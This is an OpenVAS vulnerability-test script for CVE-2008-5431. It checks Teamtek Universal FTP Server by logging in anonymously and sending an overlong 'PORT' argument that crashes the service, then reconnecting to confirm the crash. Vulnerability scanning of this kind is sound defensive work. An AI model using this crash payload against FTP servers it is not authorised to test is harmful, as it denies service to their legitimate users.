###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_teamtek_uftp_serv_mult_cmd_dos_vuln.nasl 16 2013-10-27 13:09:52Z jan $
#
# Teamtek Universal FTP Server Multiple Commands Denial Of Service Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2008 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allows remote attackers to crash the affected
  application, denying the service to legitimate users.
  Impact Level: Application";
tag_affected = "Teamtek, Universal FTP Server version 1.0.50 and prior on Windows.";
tag_insight = "The flaws are exists due to run-time error while executing CWD, LIST, PORT,
  STOR, PUT and MKD commands. These commands are not properly sanitised.";
tag_solution = "No solution or patch is available as of 16th December, 2008. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.5e5.net/universalftp.html";
tag_summary = "The host is running Universal FTP server and is prone to Denial of
  Service Vulnerabilities.";

if(description)
{
  script_id(800322);
  script_version("$Revision: 16 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2008-12-16 16:12:00 +0100 (Tue, 16 Dec 2008)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2008-5431");
  script_bugtraq_id(27804);
  script_name("Teamtek Universal FTP Server Multiple Commands DoS Vulnerabilities");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/22553");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/488142/100/200/threaded");

  script_description(desc);
  script_summary("Check for the Version of Universal FTP Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2008 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port){
  port = 21;
}

if("UNIVERSAL FTP SERVER" >!< get_ftp_banner(port)){
  exit(0);
}

if(!safe_checks())
{
  soc = open_sock_tcp(port);
  if(!soc){
    exit(0);
  }

  # Authenticate with anonymous user (Before crash)
  if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous")){
    exit(0);
  }

  ftp_send_cmd(socket:soc, cmd:string("PORT AAAAAAAAAAAAAAAAA \r\n"));
  sleep(5);
  close(soc);

  # Check for UFTP Service Status
  soc = open_sock_tcp(port);
  if(!soc)
  {
    security_warning(port);
    exit(0);
  }
  else if(soc)
  {
    # Re-authenticate with anonymous user (After crash)
    if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous")){
      security_warning(port);
    }
    close(soc);
  }
}